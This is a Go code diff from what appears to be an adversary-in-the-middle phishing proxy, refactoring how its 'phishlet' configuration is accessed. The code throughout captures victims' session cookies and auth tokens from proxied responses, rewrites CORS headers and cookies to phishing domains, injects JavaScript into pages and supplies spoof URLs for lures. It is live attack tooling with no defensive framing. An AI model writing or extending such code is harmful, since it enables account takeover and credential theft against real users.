@@ -39,9 +39,9 @@ func (c *connection) rewriteCORSHeaders(resp *http.Response) {
 	if origin == "" || origin == "*" {
 		return
 	}
-	for _, ph := range c.phishlet.ProxyHosts {
+	for _, ph := range c.phishlet.Definition.ProxyHosts {
 		upstream := ph.OriginHost()
-		phish := ph.PhishHost(c.phishlet.BaseDomain)
+		phish := ph.PhishHost(c.phishlet.Config.BaseDomain)
 		origin = strings.ReplaceAll(origin, upstream, phish)
 	}
 	resp.Header.Set("Access-Control-Allow-Origin", origin)
@@ -59,7 +59,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 	// Lazily read body only if needed and content is text-based.
 	var bodyBytes []byte
 	if isMutableMIME(resp.Header.Get("Content-Type")) {
-		for _, rule := range c.phishlet.AuthTokens {
+		for _, rule := range c.phishlet.Definition.AuthTokens {
 			if rule.Type == aitm.TokenTypeBody {
 				var err error
 				bodyBytes, err = readResponseBody(resp)
@@ -75,7 +75,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 	}
 
 	updated := false
-	for _, rule := range c.phishlet.AuthTokens {
+	for _, rule := range c.phishlet.Definition.AuthTokens {
 		switch rule.Type {
 		case aitm.TokenTypeCookie:
 			updated = extractCookie(c.session, cookies, rule) || updated
@@ -86,7 +86,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 		}
 	}
 
-	if !c.session.IsDone() && c.server.SessionSvc.IsComplete(c.session, c.phishlet) {
+	if !c.session.IsDone() && c.server.SessionSvc.IsComplete(c.session, c.phishlet.Definition) {
 		if err := c.server.SessionSvc.Complete(c.session); err != nil {
 			c.server.Logger.Warn("failed to complete session", "session_id", c.session.ID, "error", err)
 		} else {
@@ -132,8 +132,8 @@ func (c *connection) rewriteCookies(resp *http.Response) {
 			SameSite: http.SameSiteNoneMode,
 		}
 
-		if len(c.phishlet.ProxyHosts) > 1 {
-			tracker.Domain = c.phishlet.BaseDomain
+		if len(c.phishlet.Definition.ProxyHosts) > 1 {
+			tracker.Domain = c.phishlet.Config.BaseDomain
 		}
 
 		resp.Header.Add("Set-Cookie", tracker.String())
@@ -156,7 +156,7 @@ func (c *connection) applySubFilters(resp *http.Response) {
 		bodyBytes = []byte(replacer.Replace(string(bodyBytes)))
 	}
 
-	for _, subFilter := range c.phishlet.SubFilters {
+	for _, subFilter := range c.phishlet.Definition.SubFilters {
 		if !subFilter.MatchesMIME(contentType) {
 			continue
 		}
@@ -195,7 +195,7 @@ func (c *connection) injectJS(resp *http.Response) {
 	scriptContent.WriteString(redirectScript)
 
 	if resp.Request != nil {
-		for _, jsInject := range c.phishlet.JSInjects {
+		for _, jsInject := range c.phishlet.Definition.JSInjects {
 			if jsInject.TriggerDomain == resp.Request.Host &&
 				jsInject.TriggerPath.MatchString(resp.Request.URL.Path) {
 				scriptContent.WriteString(jsInject.Script)
@@ -245,8 +245,8 @@ func (c *connection) spoofURL() string {
 		return c.lure.SpoofURL
 	}
 
-	if c.phishlet != nil && c.phishlet.SpoofURL != "" {
-		return c.phishlet.SpoofURL
+	if c.phishlet != nil && c.phishlet.Config.SpoofURL != "" {
+		return c.phishlet.Config.SpoofURL
 	}
 
 	return ""
@@ -255,7 +255,7 @@ func (c *connection) spoofURL() string {
 func (c *connection) expandTemplate(tmpl string) string {
 	var pairs []string
 	if c.phishlet != nil {
-		pairs = append(pairs, "{hostname}", c.phishlet.Hostname, "{domain}", c.phishlet.BaseDomain)
+		pairs = append(pairs, "{hostname}", c.phishlet.Config.Hostname, "{domain}", c.phishlet.Config.BaseDomain)
 	}
 
 	if c.session != nil {
